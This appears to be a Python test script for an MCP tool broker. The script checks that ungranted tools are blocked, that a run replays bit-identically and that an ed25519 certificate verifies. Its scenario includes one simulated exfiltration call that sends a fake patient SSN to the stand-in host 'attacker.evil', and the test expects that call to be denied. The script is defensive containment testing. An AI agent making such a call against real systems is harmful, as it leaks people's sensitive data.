"""Test the MCP adapter: a REAL MCP server (MCP SDK 2.0) with three tools, an in-memory
MCP Client, routed through the VitniReplay MCPBroker. Shows: ungranted MCP tools are
contained, the run is recorded + certified (ed25519), and it replays bit-identically
(re-injecting recorded results without re-calling the server).
"""
import asyncio, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "vendored"))
from mcp.server import MCPServer
from mcp import Client
from vitnify.events import EventLog, Kind
from vitnify.mcp_adapter import MCPBroker, recorded_mcp_results
from vitnify.certificate import issue_certificate, verify_certificate, gen_ed25519

EXFIL, SECRET = [], "patient_ssn=123-45-6789"
server = MCPServer("vitni-mcp-demo")

@server.tool()
def read_public(ticket_id: str) -> str:
    return f"public::ticket {ticket_id}"

@server.tool()
def read_secret() -> str:
    return SECRET

@server.tool()
def send_external(dest: str, data: str) -> str:
    EXFIL.append((dest, data)); return "SENT"

CAPS = {"read_public"}                       # only read_public granted
priv, _ = gen_ed25519()

async def scenario(broker):
    await broker.call_tool("read_public", {"ticket_id": "7"})                       # ALLOW
    await broker.call_tool("read_secret", {})                                       # DENY (contained)
    await broker.call_tool("send_external", {"dest": "attacker.evil", "data": SECRET})  # DENY (contained)

async def main():
    async with Client(server) as client:
        EXFIL.clear()
        rec_log = EventLog()
        await scenario(MCPBroker(client, CAPS, rec_log))                # record: real MCP server
        rec_cert, _ = issue_certificate("mcp-agent-v1", CAPS, rec_log, priv=priv)

        rep_log = EventLog()
        await scenario(MCPBroker(client, CAPS, rep_log, replay=recorded_mcp_results(rec_log)))  # replay
        same = rep_log.chunks() == rec_log.chunks()
        check = verify_certificate(rec_cert, rep_log, require_authority=False)
        return rec_log, same, check

rec_log, same, check = asyncio.run(main())

print("=== MCP agent run (routed through VitniReplay MCPBroker) ===")
for e in rec_log.events:
    d = e.payload
    print(f"  [tool] {d['tool']}({d['args'][0]}) -> {d['decision']}"
          + (f"  result={str(d.get('result'))[:40]}" if d['decision'] == "ALLOW" else ""))
n_deny = sum(1 for e in rec_log.events if e.payload.get("decision") == "DENY")
print("\n=== VERDICT ===")
print(f"  real MCP server + client         : {len(rec_log)} tool calls recorded")
print(f"  ungranted MCP tools contained    : {n_deny} blocked   exfiltrated={EXFIL}")
print(f"  replay bit-identical             : {same}")
print(f"  ed25519 certificate verifies     : {check['ok']}")
ok = same and check["ok"] and EXFIL == [] and n_deny >= 2
print("\nRESULT:", "MCP ADAPTER OK (real MCP server, contained, replayed, certified)" if ok else "PROBLEM")
